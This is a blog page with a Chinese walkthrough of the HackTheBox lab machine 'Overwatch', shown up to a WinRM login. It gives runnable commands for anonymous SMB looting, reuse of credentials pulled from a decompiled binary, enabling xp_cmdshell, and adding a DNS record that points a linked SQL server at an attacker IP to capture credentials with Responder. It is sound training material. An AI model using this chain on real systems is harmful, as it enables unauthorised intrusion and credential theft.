@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="1. 信息搜集1.1 端口扫描对目标机器进行端口和服务扫描：发包速率过快会导致扫描结果不准确。 从扫描结果来看是一个标准的域控机器，值得关注的是53&#x2F;DNS、6520&#x2F;MSSQL服务端口对外开放。 1nmap -sC -sV --min-rate&#x3D;1000 -p- -v -O -oN .&#x2F;nmap&#x2F;overwatch.nmap 10.129.244.81  1234567891">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox Machine Overwatch">
+<meta property="og:url" content="http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="1. 信息搜集1.1 端口扫描对目标机器进行端口和服务扫描：发包速率过快会导致扫描结果不准确。 从扫描结果来看是一个标准的域控机器，值得关注的是53&#x2F;DNS、6520&#x2F;MSSQL服务端口对外开放。 1nmap -sC -sV --min-rate&#x3D;1000 -p- -v -O -oN .&#x2F;nmap&#x2F;overwatch.nmap 10.129.244.81  1234567891">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/1770740226626.png">
+<meta property="og:image" content="http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/1770740363531.png">
+<meta property="og:image" content="http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/1770740590622.png">
+<meta property="og:image" content="http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/1770740801433.png">
+<meta property="og:image" content="http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/1770740885235.png">
+<meta property="og:image" content="http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/1770742128700.png">
+<meta property="og:image" content="http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/1770741185205.png">
+<meta property="og:image" content="http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/1770741362066.png">
+<meta property="og:image" content="http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/1770741582576.png">
+<meta property="og:image" content="http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/1770741725501.png">
+<meta property="og:image" content="http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/1770742449502.png">
+<meta property="og:image" content="http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/1770742679973.png">
+<meta property="og:image" content="http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/1770742814365.png">
+<meta property="og:image" content="http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/1770743024226.png">
+<meta property="og:image" content="http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/1770743418301.png">
+<meta property="og:image" content="http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/1770743498815.png">
+<meta property="og:image" content="http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/1770743892498.png">
+<meta property="og:image" content="http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/1770743903768.png">
+<meta property="og:image" content="http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/1770743966023.png">
+<meta property="og:image" content="http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/1770744640236.png">
+<meta property="og:image" content="http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/1770744730594.png">
+<meta property="og:image" content="http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/1770744851983.png">
+<meta property="og:image" content="http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/1770745183539.png">
+<meta property="article:published_time" content="2026-02-10T15:28:22.000Z">
+<meta property="article:modified_time" content="2026-02-10T17:41:45.544Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="active directory">
+<meta property="article:tag" content="command injection">
+<meta property="article:tag" content="dns">
+<meta property="article:tag" content="mcf">
+<meta property="article:tag" content="mssql link">
+<meta property="article:tag" content="reverse">
+<meta property="article:tag" content="smb">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/1770740226626.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox Machine Overwatch</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2026/02/07/HackTheBox-Machine-Facts/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/&text=HackTheBox Machine Overwatch"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/&title=HackTheBox Machine Overwatch"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/&is_video=false&description=HackTheBox Machine Overwatch"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox Machine Overwatch&body=Check out this article: http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/&title=HackTheBox Machine Overwatch"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/&title=HackTheBox Machine Overwatch"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/&title=HackTheBox Machine Overwatch"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/&title=HackTheBox Machine Overwatch"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/&name=HackTheBox Machine Overwatch&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2026/02/10/HackTheBox-Machine-Overwatch/&t=HackTheBox Machine Overwatch"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">1. 信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.</span> <span class="toc-text">1.1 端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-DNS%E6%9E%9A%E4%B8%BE"><span class="toc-number">1.2.</span> <span class="toc-text">1.2 DNS枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-SMB%E5%85%B1%E4%BA%AB"><span class="toc-number">1.3.</span> <span class="toc-text">1.3 SMB共享</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%88%9D%E5%A7%8B%E7%AB%8B%E8%B6%B3"><span class="toc-number">2.</span> <span class="toc-text">2. 初始立足</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 逆向分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-MSSQL%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 MSSQL连接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">3.</span> <span class="toc-text">3. 横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-MSSQL-Link"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 MSSQL Link</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">4.</span> <span class="toc-text">4. 权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-MCF-Service"><span class="toc-number">4.1.</span> <span class="toc-text">4.1 MCF Service</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-MCF%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">4.2.</span> <span class="toc-text">4.2 MCF命令注入</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox Machine Overwatch
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2026-02-10T15:28:22.000Z" class="dt-published" itemprop="datePublished">2026-02-10</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/active-directory/" rel="tag">active directory</a>, <a class="p-category" href="/tags/command-injection/" rel="tag">command injection</a>, <a class="p-category" href="/tags/dns/" rel="tag">dns</a>, <a class="p-category" href="/tags/mcf/" rel="tag">mcf</a>, <a class="p-category" href="/tags/mssql-link/" rel="tag">mssql link</a>, <a class="p-category" href="/tags/reverse/" rel="tag">reverse</a>, <a class="p-category" href="/tags/smb/" rel="tag">smb</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="1-信息搜集"><a href="#1-信息搜集" class="headerlink" title="1. 信息搜集"></a>1. 信息搜集</h2><h3 id="1-1-端口扫描"><a href="#1-1-端口扫描" class="headerlink" title="1.1 端口扫描"></a>1.1 端口扫描</h3><p>对目标机器进行端口和服务扫描：发包速率过快会导致扫描结果不准确。</p>
+<p>从扫描结果来看是一个标准的域控机器，值得关注的是53&#x2F;DNS、6520&#x2F;MSSQL服务端口对外开放。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV --min-rate=1000 -p- -v -O -oN ./nmap/overwatch.nmap 10.129.244.81</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for overwatch.htb (10.129.244.81)</span><br><span class="line">Host is up (0.25s latency).</span><br><span class="line">Not shown: 65512 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-10 16:13:17Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">3389/tcp  open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: OVERWATCH</span><br><span class="line">|   NetBIOS_Domain_Name: OVERWATCH</span><br><span class="line">|   NetBIOS_Computer_Name: S200401</span><br><span class="line">|   DNS_Domain_Name: overwatch.htb</span><br><span class="line">|   DNS_Computer_Name: S200401.overwatch.htb</span><br><span class="line">|   DNS_Tree_Name: overwatch.htb</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2026-02-10T16:14:17+00:00</span><br><span class="line">| ssl-cert: Subject: commonName=S200401.overwatch.htb</span><br><span class="line">| Issuer: commonName=S200401.overwatch.htb</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2025-12-07T15:16:06</span><br><span class="line">| Not valid after:  2026-06-08T15:16:06</span><br><span class="line">| MD5:   0da8:f9a5:d788:e363:07b1:5f70:6524:ffcb</span><br><span class="line">|_SHA-1: 3287:c62d:4408:7fbb:4038:00b3:32fa:da67:fb22:14bc</span><br><span class="line">|_ssl-date: 2026-02-10T16:14:56+00:00; +3m03s from scanner time.</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">6520/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM</span><br><span class="line">| ms-sql-info: </span><br><span class="line">|   10.129.244.81:6520: </span><br><span class="line">|     Version: </span><br><span class="line">|       name: Microsoft SQL Server 2022 RTM</span><br><span class="line">|       number: 16.00.1000.00</span><br><span class="line">|       Product: Microsoft SQL Server 2022</span><br><span class="line">|       Service pack level: RTM</span><br><span class="line">|       Post-SP patches applied: false</span><br><span class="line">|_    TCP port: 6520</span><br><span class="line">| ms-sql-ntlm-info: </span><br><span class="line">|   10.129.244.81:6520: </span><br><span class="line">|     Target_Name: OVERWATCH</span><br><span class="line">|     NetBIOS_Domain_Name: OVERWATCH</span><br><span class="line">|     NetBIOS_Computer_Name: S200401</span><br><span class="line">|     DNS_Domain_Name: overwatch.htb</span><br><span class="line">|     DNS_Computer_Name: S200401.overwatch.htb</span><br><span class="line">|     DNS_Tree_Name: overwatch.htb</span><br><span class="line">|_    Product_Version: 10.0.20348</span><br><span class="line">|_ssl-date: 2026-02-10T16:14:57+00:00; +3m04s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Issuer: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 3072</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2026-02-10T15:55:13</span><br><span class="line">| Not valid after:  2056-02-10T15:55:13</span><br><span class="line">| MD5:   5ffb:ec08:53ca:712d:7afc:a4e5:2da0:f751</span><br><span class="line">|_SHA-1: f513:dd78:3d43:176b:ef1f:80cf:62d4:b724:0d0d:899d</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49664/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49668/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">53326/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">55777/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">55778/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">55785/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">59046/tcp open  tcpwrapped</span><br><span class="line">59063/tcp open  tcpwrapped</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2022|2012 (88%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2022 (88%), Microsoft Windows Server 2012 R2 (85%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Uptime guess: 0.015 days (since Tue Feb 10 10:49:49 2026)</span><br><span class="line">TCP Sequence Prediction: Difficulty=264 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: Incremental</span><br><span class="line">Service Info: Host: S200401; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 3m03s, deviation: 0s, median: 3m02s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2026-02-10T16:14:20</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/share/nmap</span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Nmap <span class="keyword">done</span> at Tue Feb 10 11:12:01 2026 -- 1 IP address (1 host up) scanned <span class="keyword">in</span> 312.91 seconds</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-DNS枚举"><a href="#1-2-DNS枚举" class="headerlink" title="1.2 DNS枚举"></a>1.2 DNS枚举</h3><p>查询该域的所有类型记录：除了域控外，没有其他机器。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig ang overwatch.htb @s200401.overwatch.htb</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/10/HackTheBox-Machine-Overwatch/1770740226626.png" alt="1770740226626"></p>
+<h3 id="1-3-SMB共享"><a href="#1-3-SMB共享" class="headerlink" title="1.3 SMB共享"></a>1.3 SMB共享</h3><p>对SMB服务进行枚举，发现了可以匿名访问的SMB共享software$。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.129.244.81 -u &#x27;null&#x27; -p &#x27;&#x27; --shares</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/10/HackTheBox-Machine-Overwatch/1770740363531.png" alt="1770740363531"></p>
+<p>SMB匿名连接，并且递归下载Monitoring文件夹内所有文件。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.129.244.81/software$</span><br><span class="line">recurse ON</span><br><span class="line">prompt OFF</span><br><span class="line">mget *</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/10/HackTheBox-Machine-Overwatch/1770740590622.png" alt="1770740590622"></p>
+<h2 id="2-初始立足"><a href="#2-初始立足" class="headerlink" title="2. 初始立足"></a>2. 初始立足</h2><h3 id="2-1-逆向分析"><a href="#2-1-逆向分析" class="headerlink" title="2.1 逆向分析"></a>2.1 逆向分析</h3><p>大概浏览一下下载的文件，大部分都是动态链接库，EF框架、SQLite数据库等的动态链接库文件。</p>
+<p><img src="/2026/02/10/HackTheBox-Machine-Overwatch/1770740801433.png" alt="1770740801433"></p>
+<p>用Dnspy对二进制程序overwatch.exe进行分析。</p>
+<p>在Program类中有个CheckEdgeHistory函数，其中存在Edge History数据库凭证<code>sqlsvc:TI0LKcfHzZw1Vv</code>。</p>
+<p><img src="/2026/02/10/HackTheBox-Machine-Overwatch/1770740885235.png" alt="1770740885235"></p>
+<p>并且在.NET应用程序配置文件中，发现了一个URL，应该是内网的Web服务。</p>
+<p><img src="/2026/02/10/HackTheBox-Machine-Overwatch/1770742128700.png" alt="1770742128700"></p>
+<h3 id="2-2-MSSQL连接"><a href="#2-2-MSSQL连接" class="headerlink" title="2.2 MSSQL连接"></a>2.2 MSSQL连接</h3><p>通过认证验证上述凭证是否是域内账户。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.129.244.81 -u sqlsvc -p TI0LKcfHzZw1Vv</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/10/HackTheBox-Machine-Overwatch/1770741185205.png" alt="1770741185205"></p>
+<p>尝试密码复用连接MSSQL数据库，注意要使用Window身份验证，而不是SQLServer身份验证。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python mssqlclient.py -p 6520 -windows-auth overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv@s200401.overwatch.htb</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/10/HackTheBox-Machine-Overwatch/1770741362066.png" alt="1770741362066"></p>
+<h2 id="3-横向移动"><a href="#3-横向移动" class="headerlink" title="3. 横向移动"></a>3. 横向移动</h2><h3 id="3-1-MSSQL-Link"><a href="#3-1-MSSQL-Link" class="headerlink" title="3.1 MSSQL Link"></a>3.1 MSSQL Link</h3><p>查询数据库内容，除了系统数据库外，只有overwatch这个用户自定义数据库。</p>
+<p>在此数据库中只有一张Eventlog表，其中内容为空。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select name from sys.databases;</span><br><span class="line">use overwatch;</span><br><span class="line">select * from information_schema.tables;</span><br><span class="line">select * from Eventlog;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/10/HackTheBox-Machine-Overwatch/1770741582576.png" alt="1770741582576"></p>
+<p>查询当前用户身份，并不是系统管理员，没有开启组件的权限。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select is_srvrolemember(&#x27;sysadmin&#x27;);</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1; reconfigure;</span><br><span class="line">exec sp_configure &#x27;xp_cmdshell&#x27;, 1; reconfigure;</span><br><span class="line">exec xp_cmdshell &#x27;whoami&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/10/HackTheBox-Machine-Overwatch/1770741725501.png" alt="1770741725501"></p>
+<p>列举链接服务器，结果显示除了S200401机器之外，还有一台SQL07机器。</p>
+<p>但是该链接服务器连接失败，服务不可达导致时间超时。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">enum_links</span><br><span class="line">use_link [SQL07]</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/10/HackTheBox-Machine-Overwatch/1770742449502.png" alt="1770742449502"></p>
+<p>因为所有域内用户都有权限添加DNS记录，所以可以尝试添加一条DNS记录指向攻击机。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD -d overwatch.htb -u sqlsvc -p TI0LKcfHzZw1Vv --dc-ip 10.129.244.81 add dnsRecord SQL07 10.10.17.249</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/10/HackTheBox-Machine-Overwatch/1770742679973.png" alt="1770742679973"></p>
+<p>继续用dig进行DNS记录查看，DNS记录添加成功。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig ang sql07.overwatch.htb @s200401.overwatch.htb</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/10/HackTheBox-Machine-Overwatch/1770742814365.png" alt="1770742814365"></p>
+<p>开启Responder监听后，继续连接sql07实例，捕获到了一组用户凭据<code>sqlmgmt:bIhBbzMMnB82yx</code>。</p>
+<p>该链接数据库配置的是SQLServer认证，在链接时，使用数据库配置的凭证进行认证。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I tun0</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/10/HackTheBox-Machine-Overwatch/1770743024226.png" alt="1770743024226"></p>
+<p>之后密码复用，通过WinRM连接，连接成功。</p>
